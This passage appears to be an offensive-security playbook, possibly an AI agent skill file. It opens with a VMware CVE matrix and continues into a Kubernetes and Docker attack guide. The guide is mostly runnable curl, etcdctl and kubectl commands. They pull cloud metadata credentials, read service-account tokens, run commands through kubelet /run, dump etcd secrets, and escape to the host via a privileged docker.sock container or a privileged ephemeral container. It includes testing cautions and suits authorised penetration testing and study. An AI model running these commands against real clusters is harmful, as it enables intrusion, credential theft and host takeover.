- **Affected:** vCenter Server 6.5 < 6.5 U3p, 6.7 < 6.7 U3n, 7.0 < 7.0 U2b (vSAN Health Check plugin is enabled by default whether or not vSAN is in use).
- **Attack flow:** Unauthenticated abuse of `ProxygenController` in the vSAN Health plugin → Java unsafe reflection chained with an SSRF primitive → arbitrary method invocation as `vsphere-ui` → command execution.
- **Root cause:** Missing input validation + dangerous reflection sink reachable from an unauthenticated REST surface.
- **Disclosure:** Reported by Ricter Z (Yang Hao) of 360 Noah Lab; advisory VMSA-2021-0010 published 2021-05-25. Public PoC and Metasploit module followed within days; honeypots saw active exploitation. Year discovered 2021, patched 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2021-0010.html ; https://noahblog.360.cn/vcenter-server-rce/ (Ricter Z writeup) ; https://www.rapid7.com/db/modules/exploit/linux/http/vmware_vcenter_vsan_health_rce/ ; https://www.bleepingcomputer.com/news/security/vmware-warns-of-critical-bug-affecting-all-vcenter-server-installs/

### 3. CVE-2021-22005 — vCenter Analytics service arbitrary file upload → RCE
- **Affected:** vCenter Server 6.7 < 6.7 U3o, 7.0 < 7.0 U2d. Cloud Foundation 3.x/4.x bundled vCenter.
- **Attack flow:** Unauth POST to the Analytics endpoint on port 443 (`/analytics/telemetry/ph/api/hyper/send`) writes attacker-controlled file outside the intended directory; chained with subsequent service abuse to reach RCE as the vCenter service account.
- **Root cause:** Analytics/CEIP endpoint did not authenticate file uploads and did not validate target path.
- **Disclosure:** VMware advisory VMSA-2021-0020 published 2021-09-21. Working PoC by @testanull / @wvu released within ~72h; CISA issued an emergency alert 2021-09-24. **CISA KEV:** added 2021-11-03. Year discovered 2021, patched 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2021-0020.html ; https://www.cisa.gov/news-events/alerts/2021/09/24/vmware-vcenter-server-vulnerability-cve-2021-22005-under-active-exploit ; https://www.rapid7.com/blog/post/2021/09/21/critical-vcenter-server-file-upload-vulnerability-cve-2021-22005/ ; https://www.bleepingcomputer.com/news/security/working-exploit-released-for-vmware-vcenter-cve-2021-22005-bug/

### 4. CVE-2022-22954 — Workspace ONE Access / Identity Manager FreeMarker SSTI → RCE
- **Affected:** Workspace ONE Access 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0; Identity Manager 3.3.3 → 3.3.6; vRealize Automation 7.6.
- **Attack flow:** Unauth GET to `/catalog-portal/ui/oauth/verify?deviceUdid=${...}` injects a FreeMarker template; `freemarker.template.utility.Execute` runs OS commands as the `horizon` service account. Single-request RCE.
- **Root cause:** Catalog-portal endpoint passed attacker-controlled query parameter into FreeMarker render without sandboxing the Execute utility.
- **Disclosure:** Reported by Steven Seeley (mr_me) of Source Incite; VMware advisory VMSA-2022-0011 published 2022-04-06. PoCs public within 48h; widespread mass-exploitation followed. **CISA KEV:** added 2022-04-14. CISA AA22-138B (May 2022) documents IR engagements at "large organizations" exploited via this CVE. Year discovered 2022, patched 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0011.html ; https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-138b ; https://srcincite.io/blog/2022/04/19/cve-2022-22954-vmware-workspace-one-access-pre-auth-rce.html ; https://www.crowdsec.net/blog/new-surge-in-vmware-cve-2022-22954-exploit-attempts

### 5. CVE-2022-22972 — Workspace ONE Access / Identity Manager / vRealize Automation Host-header authentication bypass
- **Affected:** Workspace ONE Access 21.08.0.1; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6 (and downstream Cloud Foundation bundles).
- **Attack flow:** Manipulate the HTTP `Host` header during local-domain login flow; the server routes its internal validation request to the attacker-controlled hostname → returns admin session without legitimate credentials.
- **Root cause:** Host header used unvalidated as the target for the internal auth-validation request — classic SSRF-into-self with trust elevation.
- **Disclosure:** Reported by Bruno López of Innotec Security; VMware advisory VMSA-2022-0014 published 2022-05-18. **CISA Emergency Directive 22-03** (2022-05-18) ordered all U.S. federal civilian agencies to patch or remove affected VMware installations by 2022-05-24 — the same agencies that had just been told the same thing for CVE-2022-22954 six weeks earlier. Year discovered 2022, patched 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0014.html ; https://www.cisa.gov/news-events/directives/ed-22-03-mitigate-vmware-vulnerabilities ; https://www.rapid7.com/blog/post/2022/05/19/cve-2022-22972-critical-authentication-bypass-in-vmware-workspace-one-access-identity-manager-and-vrealize-automation/ ; https://www.assetnote.io/resources/research/understanding-cve-2022-22972-vmware-workspace-one-access-auth-bypass

### 6. CVE-2023-20887 — VMware Aria Operations for Networks (vRealize Network Insight) pre-auth command injection → RCE
- **Affected:** Aria Operations for Networks (formerly vRealize Network Insight / vRNI) 6.2 through 6.10.
- **Attack flow:** Two-issue chain — (a) reach the Apache Thrift endpoint exposed on the management interface despite no authentication, (b) inject shell metacharacters into a parameter passed to a `bash -c` invocation. Single unauth POST → root.
- **Root cause:** Thrift RPC endpoint exposed without auth + downstream shell-string composition with user input.
- **Disclosure:** Reported by Sina Kheirkhah (@SinSinology) of Summoning Team to ZDI; advisory VMSA-2023-0012 published 2023-06-07. Public PoC released same week. **CISA KEV:** added 2023-06-22 after observed in-the-wild exploitation. Year discovered 2023, patched 2023.
- **References:** https://www.vmware.com/security/advisories/VMSA-2023-0012.html ; https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/ ; https://blogs.juniper.net/en-us/threat-research/cve-2023-20887-vmware-aria-operations-for-networks-unauthenticated-remote-code-execution ; https://github.com/sinsinology/CVE-2023-20887

### 7. CVE-2023-34048 — vCenter Server DCERPC pre-auth out-of-bounds write → RCE (APT-exploited zero-day)
- **Affected:** vCenter Server 7.0 < 7.0 U3o, 8.0 < 8.0 U1d/U2b; VMware Cloud Foundation bundles.
- **Attack flow:** Unauthenticated network actor sends a crafted DCE/RPC packet to the vmdir/vmafd service → out-of-bounds write in the DCE/RPC protocol implementation → memory corruption → code execution. Forensic tell: `vmdird` crashes shortly before backdoor deployment.
- **Root cause:** OOB write in DCE/RPC marshalling layer of vCenter management services.
- **Disclosure:** Reported by Grigory Dorodnov of Trend Micro ZDI (publication ZDI-23-1623, suggesting a paid ZDI submission — bounty undisclosed). Advisory VMSA-2023-23 published 2023-10-24. **Mandiant** later attributed in-the-wild exploitation to **UNC3886** (China-nexus espionage) since late 2021 — a ~1.5-year zero-day window before patch. **CISA KEV:** added 2024-01-22. Year discovered 2023 (patched), exploited since 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2023-0023.html ; https://www.zerodayinitiative.com/advisories/ZDI-23-1623/ ; https://cloud.google.com/blog/topics/threat-intelligence/chinese-vmware-exploitation-since-2021/ (Mandiant) ; https://www.bleepingcomputer.com/news/security/chinese-hackers-exploit-vmware-bug-as-zero-day-for-two-years/

### 8. CVE-2024-37085 — ESXi Active Directory integration "ESX Admins" auth bypass (ransomware-favorite)
- **Affected:** ESXi 7.0 < ESXi70U3q-24585291, ESXi 8.0 < ESXi80U3-24022510; vCenter-managed clusters where ESXi is joined to AD.
- **Attack flow:** Attacker with sufficient AD rights creates (or re-creates after deletion) a group literally named `ESX Admins` and adds an account. ESXi auto-grants every member full admin rights without checking that the group existed at join time. End-to-end: AD foothold → group create → SSH/API root on every domain-joined ESXi host → mass VM encryption.
- **Root cause:** Hard-coded trust of group name `ESX Admins` with no domain-scoped identity validation.
- **Disclosure:** Reported by Microsoft Threat Intelligence; advisory VMSA-2024-0013 published 2024-06-25. **Microsoft Security Blog** documents pre-patch exploitation by **Storm-0506 (Black Basta), Storm-1175, Octo Tempest, and Manatee Tempest** ransomware operators — including a confirmed Black Basta deployment at a North American engineering firm. **CISA KEV:** added 2024-07-30. Year discovered 2024 (exploited as 0-day), patched 2024.
- **References:** https://www.vmware.com/security/advisories/VMSA-2024-0013.html ; https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/ ; https://www.rapid7.com/blog/post/2024/07/30/vmware-esxi-cve-2024-37085-targeted-in-ransomware-campaigns/ ; https://thehackernews.com/2024/07/vmware-esxi-flaw-exploited-by.html

### 9. CVE-2024-22273 — ESXi / Workstation / Fusion / vCenter storage controller OOB read/write
- **Note on the original ticket:** This CVE was listed in the brief as "Aria SSRF," but the actual NVD record describes an **ESXi/vCenter storage controller out-of-bounds read/write**, not an Aria SSRF. The closest Aria SSRF-adjacent issue in the 2024 cycle is **CVE-2023-34063** (VMSA-2024-0001) — Aria Automation missing access control allowing authenticated cross-org access; CVSSv3 9.9. Both are cited so the matrix is technically accurate.
- **Affected (CVE-2024-22273):** ESXi 7.0/8.0, Workstation 17.x, Fusion 13.x. vCenter Server packaged variants. Requires VM-local access with storage controllers enabled.
- **Attack flow:** VM with storage controllers enabled can issue crafted I/O to trigger OOB read/write on the host → information disclosure or DoS of the host (escape not directly demonstrated). CVSS 8.1 (Important).
- **Root cause:** Missing bounds check in the storage controller emulation path.
- **Disclosure:** Reported by Hao Zheng (@zhz) and Jiaqing Huang (@s0duku) of TianGong Team, Legendsec @ Qi'anxin Group. Advisory VMSA-2024-0011 published 2024-05-21. Year discovered 2024, patched 2024.
- **References:** https://www.vmware.com/security/advisories/VMSA-2024-0011.html ; https://nvd.nist.gov/vuln/detail/CVE-2024-22273 ; https://www.rapid7.com/db/vulnerabilities/vmsa-2024-0011-cve-2024-22273/
- **Aria-specific companion — CVE-2023-34063 (VMSA-2024-0001):** Aria Automation 8.11.x–8.14.x missing access control — authenticated actor obtains unauthorized cross-organization access to remote workflows. CVSSv3 9.9. Patched in Aria Automation 8.16. References: https://www.vmware.com/security/advisories/VMSA-2024-0001.html ; https://www.cisa.gov/news-events/alerts/2024/01/17/vmware-releases-security-advisory-aria-automation

### 10. CVE-2020-3992 + CVE-2021-21974 — ESXi OpenSLP pre-auth use-after-free / heap overflow (ESXiArgs ransomware vector)
- **Affected:** ESXi 6.5, 6.7, 7.0 prior to the OpenSLP patches (ESXi70U1c-17325551 / ESXi670-202102401-SG / ESXi650-202102101-SG). OpenSLP service on TCP/427.
- **Attack flow:** Unauth attacker sends a crafted SLP packet to port 427 → memory corruption in the SLP daemon → code execution as root on the hypervisor. CVE-2020-3992 is the use-after-free (VMSA-2020-0023); CVE-2021-21974 is the heap-overflow variant (VMSA-2021-0002, same release wave as 21972).
- **Root cause:** OpenSLP daemon — long-deprecated, exposed by default until 2021 — has unsafe parsing of SLP message frames.
- **Disclosure:** CVE-2020-3992 reported by Lucas Leong of Trend Micro ZDI (ZDI-20-1376, paid ZDI submission). CVE-2021-21974 reported by Lucas Leong of Trend Micro ZDI as well. **CISA KEV:** CVE-2020-3992 added 2021-11-03; CVE-2021-21974 added 2023-02-08. **ESXiArgs ransomware campaign** (Feb 2023) hit ~3,800 internet-exposed hosts via CVE-2021-21974 — two years after patch was available. VMware disabled SLP by default in subsequent releases. Year discovered 2020/2021, patched 2020/2021, mass-exploited 2023.
- **References:** https://www.vmware.com/security/advisories/VMSA-2020-0023.html ; https://www.vmware.com/security/advisories/VMSA-2021-0002.html ; https://www.zerodayinitiative.com/advisories/ZDI-20-1376/ ; https://www.cisa.gov/known-exploited-vulnerabilities-catalog ; https://www.bleepingcomputer.com/news/security/massive-esxiargs-ransomware-attack-targets-vmware-esxi-servers-worldwide/ ; https://www.recordedfuture.com/blog/esxiargs-ransomware-targets-vmware-esxi-openslp-servers

### Bonus: CVE-2022-31656 — Workspace ONE Access / Identity Manager / vRealize Automation auth bypass (post-22972 follow-up)
- **Affected:** Same product matrix as 22954/22972. Workspace ONE Access 21.08.x; Identity Manager 3.3.3–3.3.6; vRealize Automation 7.6.
- **Attack flow:** Network-only actor obtains admin without authenticating; chained with CVE-2022-31659 (auth'd RCE) the pair yields pre-auth admin RCE — the spiritual successor to the 22954+22972 pair.
- **Root cause:** Local-domain auth flow trusted a parameter that could be supplied without prior auth.
- **Disclosure:** Reported by **PetrusViet** of VNG Security; advisory VMSA-2022-0021 published 2022-08-02. PetrusViet released chain writeup + PoC. Year 2022.
- **References:** https://www.vmware.com/security/advisories/VMSA-2022-0021.html ; https://www.greynoise.io/blog/vmware-workspace-one-vulnerabilities-cve-2022-31656-and-cve-2022-31659 ; https://attackerkb.com/topics/RuMGC8Q1pE/cve-2022-31656

---

## Key meta-references (cross-CVE)

- **CISA KEV catalog (VMware filter):** https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=vmware — VMware is one of the most-represented vendors; cross-check any vCenter/ESXi/Workspace finding here before grading severity.
- **Broadcom (formerly VMware) advisories index:** https://support.broadcom.com/security-advisories (legacy https://www.vmware.com/security/advisories.html). Search by VMSA-YYYY-NNNN.
- **ZDI published advisories:** https://www.zerodayinitiative.com/advisories/published/ — filter "VMware" for the canonical paid-bounty disclosures (CVE-2020-3992, CVE-2023-34048, multiple Aria Operations and vRNI).
- **Mandiant UNC3886 reporting:** Google Cloud Threat Intelligence has the deepest published forensic trail on long-tail vCenter zero-day exploitation. Pair with the `mid-engagement-ir-detection` skill when working a target where vCenter is reachable.

The pattern across every entry above: **VMware management-plane CVEs are pre-auth, network-reachable, and mass-exploited within days of patch.** When external recon surfaces any of these products at a current-minus-one patch level, that is a Critical finding worth a same-day callout in the deliverable — not a Medium info-disclosure.



---

## k8s

# HUNT-K8S — Kubernetes & Docker Security

## Crown Jewel Targets

K8s API anonymous cluster-admin = full cluster control. docker.sock + RCE = host root. A single privileged-pod create or a kubelet `/run` shell pivots one finding to total compromise.

**Highest-value findings:**
- **K8s API anonymous cluster-admin** — `system:anonymous`/`system:unauthenticated` bound to a powerful role (classic misconfig: `system:anonymous` in a `ClusterRoleBinding` to `cluster-admin`) → full `kubectl`. Mere anonymous `200` is NOT this (see false-positive section).
- **Kubelet `10250` exec/run** — `/run` returns command output directly; `/exec` is a SPDY/WebSocket stream (see Phase 3). Either → RCE in any pod → steal that pod's SA token.
- **API-server-mediated kubelet RCE** — `/api/v1/nodes/<node>/proxy/run/...` reaches the kubelet *through* the API server using your (low-priv) token; if RBAC grants `nodes/proxy`, you get pod RCE without touching 10250 directly. Primary 2024-2026 vector.
- **etcd `2379` unauth** — every Secret (SA tokens, TLS keys, app creds) stored, often plaintext (unless `EncryptionConfiguration` is set) → full credential dump.
- **docker.sock exposure** — SSRF/LFI/RCE reaching `/var/run/docker.sock` → create `--privileged` container, bind-mount host `/` → host root.
- **Container escape via runc** — Leaky Vessels (CVE-2024-21626): `WORKDIR`/`process.cwd` pointing at a leaked `/proc/self/fd/<n>` host FD → break out of an attacker-controlled image/exec to host root.
- **SA token abuse** — auto-mounted token at `/var/run/secrets/kubernetes.io/serviceaccount/token`; check its real grants with SelfSubjectRulesReview before claiming impact.
- **K8s Dashboard skip-login / token-less API** — full cluster management UI reachable unauthenticated.

---

## OOB / Confirmation Gate (Read First)

K8s findings are RCE/credential-disclosure class. House rule: **prove state change or data read, never infer from a status code.**

- A `200` on `/api/v1/namespaces` does **not** mean cluster-admin. The API server returns `200` with an RBAC-filtered (often empty `items: []`) list to *any* principal that can reach `list namespaces` — anonymous read on a few resources is common and low-impact. Confirm real privilege with **SelfSubjectRulesReview / SelfSubjectAccessReview**, then by actually reading a Secret value.
- **10255 (read-only) vs 10250 (exec)** are constantly conflated. 10255 (HTTP, no auth) is info-disclosure only — it has `/pods`, `/stats`, `/metrics`, NO exec/run. 10250 (HTTPS) is where `/run` and `/exec` live. Do not report "kubelet RCE" off a 10255 hit.
- **Blind/outbound vectors need OOB.** If you exploit SSRF→IMDS→K8s, or a pod's egress, confirm the outbound hop with a Burp Collaborator / interactsh subdomain (e.g. `curl http://<token>.<collab>` from inside the pod via `/run`). A delayed response or an echoed URL is NOT proof.
- **Impact proof = the artifact.** For exec: the literal `id`/`hostname` output. For etcd/Secret: the decoded token bytes (redact in report). For docker.sock escape: the host file content (`/etc/hostname` of the node, distinct from the container's).
- Use a **dedicated test namespace / test pod** when you have create rights; never exec into production workloads to "prove" RCE — list the pod and exec a read-only `id` in a pod you spun up if policy allows, or limit to a single non-destructive `id` and stop.

---

## Phase 1 — Fingerprint & Port Discovery

```bash
# Common Kubernetes / container ports
PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010"
nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open

# API server fingerprint — the /version endpoint is anonymous on most clusters
curl -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
curl -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
curl -sk "https://$TARGET:6443/healthz"

# Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60") # IMDSv2
curl -s -H "X-aws-ec2-metadata-token: $TOK" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"      # Azure AKS
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" # GKE
```
Note the `gitVersion` — it gates every CVE below.

---

## Phase 2 — Kubernetes API Anonymous / Low-Priv Access

```bash
SRV="https://$TARGET:6443"

# 1. What am I? (anonymous → "system:anonymous")
curl -sk "$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'

# 2. What can I actually DO? (the only honest privilege check)
curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
  -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'

# 3. Targeted access check for the crown-jewel verbs
for R in secrets pods nodes/proxy pods/exec; do
  curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"create\",\"resource\":\"${R%%/*}\",\"subresource\":\"${R#*/}\"}}}" \
   | grep -o '"allowed":[a-z]*' | sed "s#^#$R #"
done

# 4. Only if access review says allowed — read a real Secret to prove impact
curl -sk "$SRV/api/v1/secrets" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'
# decode one value (redact before reporting):
# echo '<base64>' | base64 -d
```

**CVE-2018-1002105** (`gitVersion` < v1.10.11/1.11.5/1.12.3): API-server proxy upgrade flaw lets an unauthenticated/low-priv user escalate to backend (kubelet/aggregated-API) requests with API-server identity → cluster-admin. Fingerprint `gitVersion` in Phase 1; if vulnerable this is the single highest-impact finding.

---

## Phase 3 — Kubelet (Port 10250) — `/run` First, `/exec` Done Right

The earlier version of this skill sent `/exec` as a plain `POST` and expected `id` output back. **That is wrong.** `/exec` is a SPDY/WebSocket *streaming* endpoint: a plain POST returns a **302 redirect to a stream location** (e.g. `/cri/exec/<token>`) that you then must read with a SPDY/WebSocket client. An operator who runs the old curl sees nothing and wrongly concludes the kubelet is patched.

```bash
SRV="https://$TARGET:10250"

# Enumerate pods (auth varies; many kubelets allow anonymous read here)
curl -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
  | grep -E '"namespace"|"name"|"containerName"' | head -40

NS=default; POD=target-pod; CTR=app

# --- PRIMITIVE A: /run — returns command output DIRECTLY (no stream handling) ---
# This is the simple correct primitive. Use this first.
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"

# --- PRIMITIVE B: /exec — SPDY/WebSocket stream, NOT a plain POST ---
# Option 1: kubeletctl handles the stream transport for you (recommended)
#   kubeletctl --server $TARGET exec "id" -p $POD -c $CTR -n $NS
#   kubeletctl --server $TARGET scan rce         # finds every exec-able pod
# Option 2: raw — the POST returns a 302 to a stream path; -v to see Location, then
#   read it with a SPDY3.1/WebSocket client (wscat / websocat), e.g.:
#   curl -sk -i -X POST "$SRV/exec/$NS/$POD/$CTR?command=id&input=1&output=1&tty=0"   # shows 302 Location
#   websocat -k "wss://$TARGET:10250/cri/exec/<token-from-Location>"

# Container logs (read-only, no stream)
curl -sk "$SRV/containerLogs/$NS/$POD/$CTR"

# Read-only kubelet 10255 — INFO DISCLOSURE ONLY, no exec/run. Do not call this "RCE".
curl -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head
curl -s "http://$TARGET:10255/metrics" | head
```

**CVE-2020-8558** (host-network trust): on affected kube-proxy, services bound to the node's `127.0.0.1` (incl. the read-only kubelet and other localhost-only services) become reachable from other pods/adjacent hosts via the node IP, defeating the localhost trust boundary — a lateral path to kubelet/etcd that were assumed loopback-only.

---

## Phase 4 — API-Server-Mediated Kubelet RCE (`nodes/proxy`)

When 10250 is firewalled but you hold a token (even a low-priv pod SA) with `nodes/proxy`, route exec **through the API server**:

```bash
SRV="https://$TARGET:6443"; H="-H \"Authorization: Bearer $TOKEN\""
NODE=$(curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)

# /run via the node proxy → output comes straight back
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  "$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR" -d "cmd=id"

# enumerate every pod on a node via the proxy
curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
```
`nodes/proxy` in any bound role is effectively node-wide RCE. **CVE-2022-3294** (kube-apiserver node-address validation): an authenticated user could redirect the API server's proxy connection to an arbitrary host/IP it could reach (proxy-to-internal SSRF / node impersonation) — relevant whenever you can influence node addresses or use the proxy subresource.

---

## Phase 4b — Ingress-NGINX "IngressNightmare" (CVE-2025-1974)
An unauthenticated attacker who can reach the ingress-nginx admission controller (`:8443`, usually cluster-internal but sometimes exposed) injects arbitrary NGINX config via a crafted `AdmissionReview` for an Ingress object -> RCE in the controller pod, whose service account is powerful -> full cluster compromise. Fingerprint controller version (`/healthz`, pod image tag) and map to <1.11.5 / <1.12.1. (CVE-2025-1974 with CVE-2025-1097/1098/24513/24514.)

## Phase 5 — etcd Unauth (Port 2379)

```bash
# etcd holds ALL cluster state. Secrets are plaintext UNLESS EncryptionConfiguration is set.
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 get / --prefix --keys-only 2>/dev/null | head -50
ETCDCTL_API=3 etcdctl --endpoints=http://$TARGET:2379 \
  get /registry/secrets --prefix 2>/dev/null | strings | grep -Ei 'token|password|tls.key|dockerconfig' | head -40

# HTTP/JSON gateway (key/range are base64; "Lw==" == "/")
curl -s "http://$TARGET:2379/v3/kv/range" -H 'Content-Type: application/json' \
  -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHQ=","limit":20}' | python3 -m json.tool

# v2 (older clusters)
curl -s "http://$TARGET:2379/v2/keys/?recursive=true" | python3 -m json.tool 2>/dev/null | head
```
A recovered SA token from etcd → replay against the API server (Phase 6) to confirm grants. **False positive:** a `200` from etcd peer port `2380` or a TLS-required port returning a handshake error is not unauth client access — only a successful `range`/`get` with key data is.

---

## Phase 6 — Service Account Token Abuse (Bound / Projected Tokens)

```bash
# From RCE/LFI inside a pod:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API="https://kubernetes.default.svc"

# Modern tokens are BOUND (projected): they have an audience + short expiry. DECODE before claiming reuse.
echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
# Look at: "aud" (must match the API server audience to be accepted),
#          "exp" (projected tokens rotate ~1h — a captured token may already be dead),
#          "kubernetes.io/serviceaccount" (pod/node binding — token dies with the pod).
# If aud is e.g. ["vault"] not the api-server audience, it will NOT authenticate to the API → not cluster impact.

# Honest privilege check, then prove with a real read
curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
curl -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
```

**EphemeralContainers node-shell escalation:** with `pods/ephemeralcontainers` (or pod `create`), attach a debug container that shares the host namespaces to escape the pod:
```bash
kubectl debug node/$NODE -it --image=busybox      # mounts host root at /host → chroot /host
# or patch an ephemeral container with hostPID/privileged via the API:
curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/strategic-merge-patch+json' \
  -d '{"spec":{"ephemeralContainers":[{"name":"x","image":"busybox","command":["sleep","1d"],"securityContext":{"privileged":true}}]}}'
```

---

## Phase 7 — Docker Socket Exposure & runc Container Escape

```bash
# docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json

# Privileged container bind-mounting host root → read/write host fs (host escape)
curl -s --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
  -X POST http://localhost/v1.41/containers/create?name=poc \
  -d '{"Image":"alpine","Cmd":["cat","/host/etc/hostname"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/poc/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/poc/logs?stdout=1"
# Impact proof = the NODE's /etc/hostname (differs from the container's hostname).
```

**Container-escape CVEs (gate on runc/version):**
- **CVE-2024-21626 — "Leaky Vessels" (runc ≤ 1.1.11):** a leaked host file descriptor via `/proc/self/fd/<n>` lets a malicious image (`WORKDIR /proc/self/fd/N`) or `runc exec` cwd escape to the host filesystem → host RCE. Test only with an image you control on a build/registry surface where you can influence the Dockerfile.
- **CVE-2019-5736 (runc):** overwrite the host `/proc/self/exe` (the runc binary) from inside a container you can exec into → host root on next runc invocation. Applies to very old runc.
- **CVE-2022-0492 (cgroups v1 `release_agent`):** a container with `CAP_SYS_ADMIN` (or able to mount cgroupfs) writes a `release_agent` that executes on the host → escape. Check container caps first.

---

## Phase 8 — Dashboard, Admission, Helm/Tiller Remnants

```bash
# Kubernetes Dashboard — correct API base is /api/v1/... UNDER the dashboard service.
curl -sk "https://$TARGET:8443/" | grep -i "kubernetes dashboard"
# token-less probe (skip-login or anonymous-bound dashboard SA):
curl -sk "https://$TARGET:8443/api/v1/secret/default"            # secrets list view
curl -sk "https://$TARGET:8443/api/v1/pod/default"               # pods list view
curl -sk "https://$TARGET:8443/api/v1/namespace"                 # namespaces
# (paths are <resource> not <resource>/<id>; a 200 with real items = unauth dashboard data access)

# Helm 2 / Tiller remnant — gRPC on 44134, historically NO auth → full cluster as Tiller's SA
nmap -p 44134 -sV $TARGET
# helm --host $TARGET:44134 ls   # if it answers, Tiller is exposed → install/delete any release

# Validating/Mutating admission webhooks — enumerate to find bypassable policy or SSRF-able webhook URLs
curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" -H "Authorization: Bearer $TOKEN"
# A webhook clientConfig.url pointing at an external/attacker-influenced host = SSRF/bypass surface.
```

---

## Chain Table

| K8s finding | Chain to | Impact |
|-------------|----------|--------|
| API anon **with confirmed secret read** | extract SA/TLS/app creds | Full cluster compromise |
| `nodes/proxy` token | API-server-mediated `/run` → pod RCE → SA token | Node-wide RCE → escalation |
| Kubelet 10250 `/run` | exec in any pod → steal SA token → API | Cluster privilege escalation |
| etcd 2379 unauth | dump all Secrets (if unencrypted) → replay token | Full credential dump |
| docker.sock | privileged container + host bind-mount | Host root |
| CVE-2024-21626 (runc) | malicious image/exec → host FD escape | Container → host root |
| EphemeralContainers / pods create | privileged/hostPID debug container | Pod → node escape |
| Projected SA token (aud matches) | API access scoped to its real RBAC | Depends on RBAC — verify first |
| Tiller 44134 exposed | helm install as Tiller SA | Cluster-admin if Tiller is privileged |

---

## False-Positive Killers

- **Anon `200` ≠ cluster-admin.** RBAC-filtered list returns `200`/empty `items`. Require SelfSubjectRulesReview to show the verbs, then an actual Secret value read.
- **10255 ≠ 10250.** Read-only kubelet has no exec/run. "Kubelet RCE" must come from a `/run` output or a completed `/exec` stream on 10250.
- **`/exec` plain-POST returns 302, not output.** Seeing no body is NOT "patched" — follow the stream (kubeletctl/websocat) before concluding either way.
- **Projected/bound SA token may be dead or wrong-audience.** Decode `exp` and `aud`; a Vault/OIDC-audience token will not authenticate to the API server.
- **etcd plaintext assumption.** If `EncryptionConfiguration` is enabled, Secret values in etcd are ciphertext — don't claim "plaintext secrets" without showing decoded bytes.
- **Version-gated CVEs.** Confirm `gitVersion` (Phase 1) / runc version before asserting CVE-2018-1002105, -2024-21626, -2019-5736, etc. A version match is a lead; the PoC output is the proof.
- **Dashboard `200` on the HTML shell** is just the login page; only a `200` with real resource JSON under `/api/v1/<resource>/<ns>` proves token-less data access.

---

## Validation Checklist

- [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND a real Secret value was read (redacted).
